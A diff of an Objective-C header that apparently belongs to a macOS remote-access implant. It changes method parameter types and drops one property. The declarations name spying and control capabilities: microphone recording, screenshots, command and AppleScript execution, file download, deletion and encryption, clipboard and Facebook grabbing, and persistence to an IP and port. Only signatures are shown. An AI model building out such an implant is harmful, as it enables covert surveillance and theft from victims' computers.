@@ -16,7 +16,6 @@
 @property (retain) NSFileManager *fileManager;
 @property (retain) NSString *skey;
 @property (retain) NSString *terminator;
-@property (retain) NSString *liveterminator;
 @property (nonatomic,strong) NSTask *systask;
 
 //convenience
@@ -33,7 +32,7 @@ extern int sockfd;
 -(void)livesendString:(NSString *)string;
 
 //mic
--(void)mic:(NSArray *)args;
+-(void)mic:(NSString *)arg;
 -(void)initmic;
 -(BOOL)stopAudio;
 -(BOOL)recordAudio;
@@ -46,28 +45,28 @@ extern int sockfd;
 - (AVCaptureDevice *)getcapturedevice;
 
 //file management
--(void)directoryList:(NSArray *)args;
--(void)download:(NSArray *)args;
--(void)rmFile:(NSArray *)args;
--(void)changeWD:(NSArray *)args;
+-(void)directoryList:(NSString *)arg;
+-(void)download:(NSString *)arg;
+-(void)rmFile:(NSString *)arg;
+-(void)changeWD:(NSString *)arg;
 -(void)receiveFile:(NSString *)saveToPath;
 -(void)sendFile:(NSData *)fileData;
--(void)encryptFile:(NSArray *)args;
--(void)decryptFile:(NSArray *)args;
+-(void)encryptFile:(NSString *)arg;
+-(void)decryptFile:(NSString *)arg;
 
 //misc
--(void)executeCMD:(NSArray *)args;
+-(void)executeCMD:(NSString *)arg;
 -(void)idleTime;
 -(void)getPid;
 -(void)getFacebook;
 -(void)getPaste;
--(void)set_brightness:(NSArray *)args;
+-(void)set_brightness:(NSString *)arg;
 -(void)screenshot;
 -(void)persistence:(NSString *)ip :(NSString *)port;
 -(void)removePersistence:(NSString *)ip :(NSString *)port;
--(void)openURL:(NSArray *)cmdarray;
+-(void)openURL:(NSString *)arg;
 -(void)runtask:(NSString *)cmd;
--(void)runAppleScript:(NSArray *)cmdarray;
+-(void)runAppleScript:(NSString *)arg;
 -(void)receivedData:(NSNotification *)notif;
 -(NSData *)GetMACAddress;
 -(NSString *)GetMACAddressDisplayString;
